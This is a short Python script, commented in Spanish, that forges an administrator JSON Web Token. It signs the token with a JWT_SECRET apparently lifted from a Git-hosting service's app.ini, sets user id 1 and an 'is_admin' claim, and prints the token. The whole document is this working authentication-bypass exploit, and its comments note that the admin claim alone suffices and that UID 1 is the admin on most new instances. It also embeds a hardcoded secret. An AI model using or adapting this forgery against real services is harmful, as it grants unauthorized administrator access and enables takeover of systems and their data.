# local -> pip install pyjwt
import jwt, time
secret = "FIAOKLQX4SBzvZ9eZnHYLTCiVGoBtkE4y5B7vMjzz3g"      # JWT_SECRET del app.ini
now = int(time.time())
payload = {
    "id": 1,                 # UID del admin (“1” en casi todas las instancias nuevas)
    "name": "administrator",
    "iat": now,
    "exp": now + 3600,
    "is_admin": True         # este claim basta
}
token = jwt.encode(payload, secret, algorithm="HS256")
print(token)

